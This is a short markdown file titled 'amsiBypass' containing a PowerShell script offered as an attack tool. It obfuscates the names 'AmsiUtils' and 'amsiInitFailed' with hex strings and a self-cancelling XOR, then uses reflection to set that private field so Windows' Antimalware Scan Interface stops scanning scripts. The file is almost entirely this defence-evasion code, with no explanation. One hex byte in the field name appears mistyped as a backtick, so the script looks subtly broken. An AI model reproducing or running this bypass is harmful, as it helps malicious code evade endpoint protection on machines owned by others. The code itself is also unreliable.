# amsiBypass

```
function X-HxStr {
    param (
        [string]$hxStri,
        [string]$key
    )

    $result = @()
    $hValues = $hxStri -split ' ' | Where-Object { $_ -match '^[A-Fa-f0-9]+$' } 
    $keyValues = $key.ToCharArray()

    if ($hValues.Length -eq 0) {
        Write-Host "No valid values found."
        return $null
    }

    for ($i = 0; $i -lt $hValues.Length; $i++) {
        if ($i % $keyValues.Length -lt $keyValues.Length) {
            $currentKeyChar = [char]$keyValues[$i % $keyValues.Length]

            try {
                $byteFromHex = [convert]::ToByte($hValues[$i], 16)
                $xorResult = $byteFromHex -bxor $currentKeyChar
                $result += '{0:X2}' -f $xorResult
            } catch {
                Write-Host "An error occurred: $_"
                continue
            }
        } else {
            Write-Host "Index out of range for key values. Check the key length."
            break
        }
    }

    if ($result.Count -eq 0) {
        Write-Host "No results were produced."
        return $null
    } else {
        return $result -join ' '
    }
}

function HToS ($hxarr) {
    return ($hxarr -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
}

$xK = "1246hhjjjkkgdddd"
$part1 = "41 6D"
$part2 = "73 69"
$part3 = "55 74 69 6C 73"
$originalAdditionalNamex = $part1 + " " + $part2 + " " + $part3
$part4 = "61 6D 73"
$part5 = "69 49 6E 69 70"
$part6 = "46 61 69 6C 65 60"
$originalFieldNameH = $part4 + " " + $part5 + " " + $part6
$additionalNameH = X-HxStr -hxStri $originalAdditionalNamex -key $xK
$fieldNameH = X-HxStr -hxStri $originalFieldNameH -key $xK
$deAdditionalNameH = X-HxStr -hxStri $additionalNameH -key $xK
$decFiNaH = X-HxStr -hxStri $fieldNameH -key $xK
$className = 'System.Management.Automation.' + (HToS $deAdditionalNameH)
$fieldName = HToS $decFiNaH

$bDecName = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($className))))
$bDFi = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fieldName))))
try {
    [Ref].Assembly.GetType($bDecName).GetField($bDFi,'NonPublic,Static').SetValue($null,$true)
    Write-Host "The field was successfully modified."
} catch {
    Write-Host "An error occurred: $_"
}




```

